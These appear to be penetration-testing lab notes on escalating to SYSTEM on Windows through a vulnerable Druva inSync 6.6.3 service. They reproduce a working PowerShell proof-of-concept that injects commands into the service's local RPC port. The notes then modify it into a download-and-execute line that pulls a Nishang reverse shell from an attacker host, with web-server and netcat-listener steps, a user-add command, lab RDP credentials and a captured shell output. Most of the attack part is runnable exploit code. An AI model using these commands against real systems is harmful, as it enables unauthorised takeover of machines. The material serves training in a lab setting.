# Vulnerable Services

We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. 

## Enumerating Installed Programs

```
wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

--> the Druva inSync application stands ou

https://www.exploit-db.com/exploits/49211

## Enumerating Local Ports

```
netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```

## Enumerating Process ID

```
get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

## Enumerating Running Service

```
get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

## Druva inSync Windows Client Local Privilege Escalation Example

1) Check Exploit POC :

https://www.exploit-db.com/exploits/49211

```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

2) Modifying PowerShell PoC :

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

Rename it to shell.ps1

Append at the bottom of the script :
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443

Modify the POC exploit :
```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

3) Starting a Python Web Server

```
python3 -m http.server 8080
```

4) Catching a SYSTEM Shell

```
nc -lvnp 9443
```

## LAB

xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!

type c:\Users\Administrator\Desktop\VulServices\flag.txt

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.16:8080/shell.ps1')"

git clone https://github.com/samratashok/nishang
cd nishang/Shells/
cp Invoke-PowerShellTcp.ps1 shell.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 9443

python3 -m http.server 8080

.\Druva.ps1

nc -lvnp 9443

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9443
Ncat: Listening on 0.0.0.0:9443
Ncat: Connection from 10.129.43.44.
Ncat: Connection from 10.129.43.44:55556.
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32>type c:\Users\Administrator\Desktop\VulServices\flag.txt
Aud1t_th0se_th1rd_paRty_s3rvices!
